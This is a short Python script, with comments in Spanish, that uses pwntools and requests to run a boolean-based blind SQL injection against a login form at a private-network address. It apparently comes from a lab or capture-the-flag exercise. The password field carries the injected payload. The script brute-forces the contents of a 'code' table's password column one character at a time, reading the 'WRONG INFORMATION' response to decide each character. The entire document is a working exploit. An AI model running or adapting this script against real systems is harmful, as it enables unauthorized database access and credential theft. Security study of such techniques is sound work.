#!/usr/bin/python3

from pwn import *
import requests, sys, time, signal, string

def def_handler(sig, frame):
    print("\n\n[!]Saliendo\n")
    sys.exit(1)

# Ctrl+C 
signal.signal(signal.SIGINT, def_handler)

# Variables Globales
main_url = "http://192.168.0.18:8080/login"
characters = string.ascii_lowercase + string.digits + ","

def makeSQLI():

    p1 = log.progress("Brute Force")
    p1.status("Starting Brute Force")

    time.sleep(2)

    extracted_info = ""

    p2 = log.progress("Extracted Points")

    for position in range(1, 100):
        for character in characters:
            
            post_data = {
                    'password': '''" or (select substr(group_concat(password),%d,1) from code)='%s'-- -''' % (position,character)

                    }

            r = requests.post(main_url, data=post_data)

            if "WRONG INFORMATION" not in r.text:
                extracted_info += character
                p2.status(extracted_info)
                break

if __name__ == '__main__':

    makeSQLI()
